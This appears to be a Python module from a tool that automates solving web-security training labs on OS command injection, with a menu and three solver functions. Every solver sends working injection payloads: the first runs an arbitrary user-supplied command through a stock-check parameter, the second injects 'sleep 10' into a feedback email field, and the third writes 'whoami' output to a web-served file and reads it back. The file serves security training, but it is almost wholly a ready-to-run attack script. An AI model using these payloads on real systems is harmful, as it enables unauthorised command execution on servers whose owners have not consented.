import modules.InputOperations as InputOperations
import modules.MenuOperations as MenuOperations
import modules.VisualEffects as VisualEffects
import modules.LabOperations as LabOperations
import modules.RequestOperations as request
import modules.Variables as Variables
import modules.Texts as Texts


def menu():
    MenuOperations.vulnerability_labs_menu("OSCi", {
        1: "OS command injection, simple case",
        2: "Blind OS command injection with time delays",
        3: "Blind OS command injection with output redirection"
    })


def solve_lab_1():
    command = InputOperations.get_input("command: ")

    VisualEffects.loading_effect(Variables.attacking_text, 2)

    stock_check_url = Variables.url + "/product/stock"
    injection_code = "1 & " + command
    parameters = {"productId": "1", "storeId": injection_code}
    response = request.session.post(stock_check_url, data=parameters, verify=False, proxies=Variables.proxies)

    if len(response.text) > 3:
        print("\n[+] Return from the target: " + response.text)


def solve_lab_2():
    VisualEffects.loading_effect(Texts.getting_csrf_token_text, 1)
    feedback_path = "/feedback"
    csrf = LabOperations.get_csrf_token(feedback_path)

    VisualEffects.loading_effect("attempting an injection...", 1)
    submit_feedback_url = Variables.url + "/feedback/submit"
    injection = "test@testmail.com & sleep 10 #"
    data = {"csrf": csrf, "name": "test", "email": injection, "subject": "test", "message": "test"}
    res = request.session.post(submit_feedback_url, data=data, verify=False, proxies=Variables.proxies)

    # Verify exploit
    if res.elapsed.total_seconds() >= 10:
        print("[+] \"email\" field vulnerable to time-based command injection!")


def solve_lab_3():
        # Getting CSRF Token
        VisualEffects.loading_effect(Texts.getting_csrf_token_text, 1)
        feedback_path = "/feedback"
        csrf_token = LabOperations.get_csrf_token(feedback_path)

        # Exploit
        submit_feedback_url = Variables.url + "/feedback/submit"
        injection = "test@testmail.com & whoami > /var/www/images/commandinjection.txt #"
        data = {"csrf": csrf_token, "name": "test", "email": injection, "subject": "test", "message": "test"}
        request.session.post(submit_feedback_url, data=data, verify=False, proxies=Variables.proxies)

        # Verify exploit
        file_path = "/image?filename=commandinjection.txt"
        response = request.session.get(Variables.url + file_path, verify=False, proxies=Variables.proxies)
        if response.status_code == 200:
            print("[+] \"email\" field vulnerable to time-based command injection!")